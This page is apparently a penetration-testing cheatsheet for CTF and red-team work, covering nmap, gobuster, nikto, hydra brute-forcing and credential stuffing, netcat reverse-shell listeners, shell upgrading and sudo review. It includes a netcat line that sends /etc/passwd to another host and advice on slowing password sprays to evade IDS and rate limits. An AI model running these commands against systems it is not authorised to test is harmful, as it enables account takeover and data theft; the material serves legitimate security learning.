---
layout: page
icon: fas fa-note-sticky
order: 4
title: "Cheatsheet"
subtitle: "Quick reference for commonly-used commands, and how to use them."
tags: [ "phases", "nmap", "gobuster", "nikto", "hydra", "wordlist", "searchsploit", "nc", "netcat", "shell", "fragile", "upgrade", "pty", "script" ]
categories: [ "cheatsheets", "reference" ]
---

<h1>
  <i class="fas fa-note-sticky"></i>&nbsp;Cheatsheet
</h1>

This is a cheatsheet, or quick reference for those commands and concepts that you quickly need to lookup.

- [Phases of Hacking](#phases-of-hacking)
- [Commands](#commands)
  - [Command: `nmap`](#command-nmap)
  - [Command: `gobuster`](#command-gobuster)
  - [Command: `nikto`](#command-nikto)
  - [Command: `hydra`](#command-hydra)
    - [OPTION 1. SSH with fixed username and password wordlist](#option-1-ssh-with-fixed-username-and-password-wordlist)
    - [OPTION 2: SSH with username wordlist and fixed password](#option-2-ssh-with-username-wordlist-and-fixed-password)
    - [OPTION 3: Webform with fixed username and password wordlist](#option-3-webform-with-fixed-username-and-password-wordlist)
    - [OPTION 4: Webform with username wordlist and fixed password](#option-4-webform-with-username-wordlist-and-fixed-password)
    - [OPTION 5: Use a `username:password` formatted file for Credential Stuffin](#option-5-use-a-usernamepassword-formatted-file-for-credential-stuffin)
  - [Command: `searchsploit`](#command-searchsploit)
  - [Command `nc` - NetCat for listening/receiving](#command-nc---netcat-for-listeningreceiving)
    - [Listen on Port 9000](#listen-on-port-9000)
    - [Quick-n-Dirty Port Scan](#quick-n-dirty-port-scan)
    - [Send/Receive a File](#sendreceive-a-file)
- [Concepts](#concepts)
  - [Concept: Upgrading a fragile shell](#concept-upgrading-a-fragile-shell)
    - [With Python `pty`](#with-python-pty)
    - [With `script`](#with-script)
  - [Concept: Seeing what commands current user can use as `sudo`](#concept-seeing-what-commands-current-user-can-use-as-sudo)
    - [Common `/etc/sudoers` Scenarios](#common-etcsudoers-scenarios)
      - [Users in `sudo` group, password required](#users-in-sudo-group-password-required)
      - [Users in `sudo` group, NO password required](#users-in-sudo-group-no-password-required)
      - [Named user can run `tar`, password required](#named-user-can-run-tar-password-required)
      - [User group `aptusers` can run `apt`, NO password required](#user-group-aptusers-can-run-apt-no-password-required)
  - [Concept: Password Spraying Attack](#concept-password-spraying-attack)
    - [A note about speed](#a-note-about-speed)
  - [Concept: Credential Stuffing Attack](#concept-credential-stuffing-attack)


## Phases of Hacking

Below are the Five Phase of Hacking:

```mermaid
flowchart LR;
    A(1. Recon) --> B(2. Scanning);
    B --> C(3. Gaining Access);
    C --> D(4. Maintaing Access*);
    D --> E(5. Covering Tracks*);
```

*\* Only used in ethical Red Team engagements, or in black hat scenarios.*

## Commands

Below are command references.

### Command: `nmap`

The `nmap` command is used to scan for open ports on a target machine.

> **Context:** This tool is run during the recon phase when you have access to a target host, and want to see what services are running on it.
{: .prompt-tip }

```bash
nmap -sCV 10.10.10.10
```

### Command: `gobuster`

The `gobuster` command is used to enumerate and discover hidden files and directories on a web server.

> **Context:** This tool is run during the recon phase when you have a known web server, and want to see if common folder paths are on that web server. Using a wordlist like that medium one below attempts 220,560 possible folders on that target (e.g. `http://10.10.10.10/admin`, `http://10.10.10.10/login`, etc.)
{: .prompt-tip }

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -u http://10.10.10.10
```

### Command: `nikto`

The `nikto` command is a vulnerability scanner that is run against a web server. This looks for misconfigurations or other issues at the web server level.

> **Context:** This tool is run during the recon phase when you have a known web server, and want to see if there are common/known vulnerabilities in that hosting environment.
{: .prompt-tip }

```bash
nikto -h 10.10.10.10
```

### Command: `hydra`

The `hydra` command is a tool to brute-force usernames, passwords, or both against targets such as SSH, login web pages, etc.

> **Context:** This tool is run during the recon phase when you have access to a target website or SSH, and want to test usernames and passwords against it. This should only be done if you have a guess of what a username or password might be. To guess all users and x all passwords will likely not be fruitful, and is impractical. Meaning, it would take a long time and it's not a practical skill in the real-world, because all of these attempts would easily get noticed on the target network.
{: .prompt-tip }

#### OPTION 1. SSH with fixed username and password wordlist

Note the lowercase `-l` for a fixed username and an uppercase `-P` which points to a wordlist. For SSH notice that you use the syntax of `ssh://10.10.10.10` where that IP address would be your target machine.

```bash
hydra -l jdoe -P /usr/share/wordlists/rockyou.txt \
    ssh://10.10.10.10
```

#### OPTION 2: SSH with username wordlist and fixed password

Note the uppercase `-L` where a wordlist will be used for the username and the lowercase `-p` that points to a fixed password. For SSH notice that you use the syntax of `ssh://10.10.10.10` where that IP address would be your target machine.

```bash
hydra -L ./usernames.txt -p admin \
    ssh://10.10.10.10
```

#### OPTION 3: Webform with fixed username and password wordlist

Note the lowercase `-l` for a fixed username and an uppercase `-P` which points to a wordlist. For a web form notice that the last part is in the form of `url:variables;failure_test`. The example below will inject the `^USER^` and `^PASS^` into those form elements and http `POST` them to `/login.php`.

```bash
hydra -l jdoe -P /usr/share/wordlists/rockyou.txt \
    10.10.10.10 http-post-form \
    "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
```

#### OPTION 4: Webform with username wordlist and fixed password

Note the uppercase `-L` where a wordlist will be used for the username and the lowercase `-p` that points to a fixed password. For a web form notice that the last part is in the form of `url:variables;failure_test`. The example below will inject the `^USER^` and `^PASS^` into those form elements and http `POST` them to `/login.php`.

```bash
hydra -L ./usernames.txt -p admin \
    10.10.10.10 http-post-form \
    "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
```

#### OPTION 5: Use a `username:password` formatted file for Credential Stuffin

If you have a file in this format:

```text
jdoe:Password123
vkrishna:SuperPazz
susanb:august2023
```

Then you can try those `username:password` combinations against a service. Here is an example of how to do that against SSH with the `-C` argument that knows how to read this file format:

```bash
hydra -C ./accounts.txt -vV 10.10.10.10 ssh
```

### Command: `searchsploit`

The `searchsploit` tool searches for exploit files on the local machine. This is based on: [https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit). Generally, just using the syntax below will work in most cases.

```bash
searchsploit <keyword>
```

In the output, the location of those files are in: `/usr/share/exploitdb/exploits/`

### Command `nc` - NetCat for listening/receiving

The `nc` (NetCat) command is a basic tool for listening or sending raw data across the network. Some example below...

#### Listen on Port 9000

In a case where you want to "catch" a reverse shell, you could listen on port 9000 (it can be any port). A way to remember the command-line arguments is "Las Vegas No Problem".

```bash
nc -lvnp 9000
```

#### Quick-n-Dirty Port Scan

You can use the `-zv` option, a port or range of ports like below to do a very quick port scan:

```bash
nc -zv 192.168.1.1 1-1000
```

Example Output:

```bash
_gateway [192.168.1.1] 443 (https) open
_gateway [192.168.1.1] 80 (http) open
_gateway [192.168.1.1] 53 (domain) open
```

#### Send/Receive a File

There are arguably easier ways to do this (e.g. `python -m http.server 8888`, `scp`, etc) but you can send files back and forth between systems.

On the **receiving** side, you want to listen on port 9001 for example, and output everything you hear to a file (notice the `-l` and `-p` from earlier):

```bash
nc -l -p 9001 > ./remote-etc-passwd
```

Then, on the other machine, you **send** the file to the listening machine, also specifying port 9001 (it can be any unused port):

```bash
nc 10.10.20.4 < /etc/passwd
```

## Concepts

Below are not necessarily single commands, but concepts that might require multiple commands or scripts.

### Concept: Upgrading a fragile shell

When you establish a reverse shell, particularly over a `nc` connection, it's basically just sending raw ASCII back and forth. There isn't any support for VT codes like: backspace, up arrow, colors, etc. So, to help get a better prompt experience, you can run commands to upgrade the shell experience, when you've received an incoming, reverse shell:

#### With Python `pty`

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### With `script`

```bash
script -q /dev/null /bin/bash
```

> **Note** that for this `script` technique that you will still see a simple `$` prompt. This is because `script` is telling `bash` to run as a subprocess, where it does not `source ~/.bashrc` by default. So, it's a little messy but if you want the prompt and other defaults in the `.bashrc`, just type `bash` to get a new shell on top of that.
{: .prompt-info }


What if you want an even better shell experience? Well, you can do <kbd>CTRL+Z</kbd>, which suspends this connection and brings you back to a shell prompt on your machine, you can then run:

```bash
# Enable backspace and control characters
stty raw -echo

# Enable line editing (backspace and command history CTRL^R)
stty -icanon min 1

# Properly handle CTRL+C and CTRL+Z
stty intr ^C susp ^Z
```

and then `fg` to bring that remote shell back to the foreground. Even better, edit your `~/.zshrc` and add the following:

```bash
alias fixshell='stty raw -echo; stty -icanon min 1; stty intr ^C susp ^Z; fg'
alias unfixshell='stty sane'
```

Then, when you get a remote shell, you can <kbd>CTRL+Z</kbd>, type `fixshell`<kbd>Enter</kbd> and it will do all of the above and return you back to the remote shell, which will be MUCH better. In fact, it's indistinguishable from an SSH connection, with the exception of colors.

The final piece to give you, what is basically an SSH shell is color support. If you:

```bash
echo $TERM
```

It will likely say `dumb`, meaning it thinks we are a "dumb terminal" who cannot support color. We can run:

```bash
export TERM=xterm-256color
```

Then, if we `source` a `.bashrc` file that we have access to, we should start seeing color:

![Color prompt](/tabs/images/color-prompt.png)

### Concept: Seeing what commands current user can use as `sudo`

When you are logged in as a non-privileged account, you can see if you are able to run any commands as `sudo`. The idea here is this: you don't want to give users the password for `root`, because that is complete control over the entire system. Instead, maybe they just need to be able to run `apt` to install software, or they need to be able to run `tar` as root to put the backup file in a special folder. You can see your `sudo` privileges, if any via:

```bash
sudo -l
```

There are really two scenarios you might see:

1. You are in the `sudo` user group, so you can run anything as root. The purpose of this is just as a precaution where you must run `sudo` whenever you are going to do something that could alter the system. This would be a sysadmin or power user type of account.
2. You are specifically named, or are in a group defined in the `/etc/sudoers` file. This might be where you are a app-support admin.

#### Common `/etc/sudoers` Scenarios

Here are some command scenarios you might see in the `/etc/sudoers` file:

##### Users in `sudo` group, password required

```text
# Allow users in the "sudo" group to run sudo commands with password
%sudo   ALL=(ALL:ALL) ALL
```

##### Users in `sudo` group, NO password required

```text
# Allow users in the "sudo" group to run sudo commands without a password
%sudo   ALL=(ALL:ALL) NOPASSWD: ALL
```

##### Named user can run `tar`, password required

```text
# Allow a specific user (replace "username" with the actual username) to run /usr/bin/tar with a password
username ALL=(ALL:ALL) /usr/bin/tar
```

##### User group `aptusers` can run `apt`, NO password required

```text
# Allow users in the "aptusers" group to run /usr/bin/apt without a password
%aptusers   ALL=(ALL:ALL) NOPASSWD: /usr/bin/apt
```

### Concept: Password Spraying Attack

Password Spraying is when the attacker tries a small subset of popular passwords against known accounts on a system. Here are some of the elements of this type of attack:

1. Enumerate account names on the target, as much as possible. Develop a `usernames.txt`.
2. Pick a few (3, 5, or maybe 10) of the most common passwords from RockYou, or any of the [countless](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials), [wordlists](https://github.com/kkrypt0nn/wordlists) that are floating around. Establish your `passwords.txt`.
3. In a Red Team scenario, run this low and slow as not to trigger the rate limit or IDS/IPS.

For that last point, `hydra` will always run as fast as possible. For a CTF, that won't matter, but in a Red Team scenario, that is going to get your IP banned immediately.

> **INFO:** An Intrusion Detection System (IDS) / Intrusion Prevention System (IPS) is a countermeasure that Blue Team has that is specifically looking for network traffic that doesn't look human. For example: this one IP address and `User-Agent` have tried 189 username/password combinations in the last minute. Running a port scan or password spray like this will likely get your "footprint" banned.
>
> A "footprint" is typically a combination of: IP address, `User-Agent`, device ID (if mobile), etc. It is a unique identifier for your computer, not just your IP which might be a VPN or proxy.
{: .prompt-info }

With your `usernames.txt` in place with one username per line, and `passwords.txt` with one password per line, you can run something this for a web form:

```bash
hydra -L ./usernames.txt -P passwords.txt \
    10.10.10.10 http-post-form \
    "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
```

and for SSH:

```bash
hydra -L ./usernames.txt -P passwords.txt \
    ssh://10.10.10.10
```

#### A note about speed

As mentioned above, in a CTF it won't matter but for Red Team, you will almost always want to slow this down. Hydra is going to run as fast as possible, but you can at least turn down the number of threads with the `-t <threads>`

If you hit a rate limit for a website, you'll know because you'll get something like:

```text
HTTP/1.1 429 Too Many Requests
Retry-After: 60
Content-Type: application/json
{
  "message": "Rate limit exceeded. Please wait and try again later."
}
```

Note the `Retry-After` HTTP header which tells you how many seconds to wait. You could work around this by slowing `hydra` way down with your own code. Something like:

```bash
# Try one username/password combination every :05 seconds
for password in $(cat password.txt); do
    hydra -l username -P - ssh://target_ip <<< "$password"
    sleep 5
done
```

### Concept: Credential Stuffing Attack

The previous Password Spraying attack is when you don't know any passwords and you might be guessing at the usernames. Conversely, Credential Stuffing is when you have known-good `username:password` combinations, typically from a data breach. So, these were valid credentials at one time.

A Credential Stuffing attack is seeing if any of these `username:password` combinations are still valid.

The `hydra` program natively supports this with the `-C` argument. From the `man` page:

```text
  -C FILE
          colon separated "login:pass" format, instead of -L/-P options
```

That means if you have a file called `accounts.txt` in a format like this:

```plaintext
jdoe:Password123
vkrishna:MYp4zzword
smiller:August2023
```

That means you could run this for a web form via:

```bash
hydra -C ./accounts.txt \
    10.10.10.10 http-post-form \
    "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
```

and SSH might look like this:

```bash
hydra -C ./accounts.txt \
    10.10.10.10 ssh
```
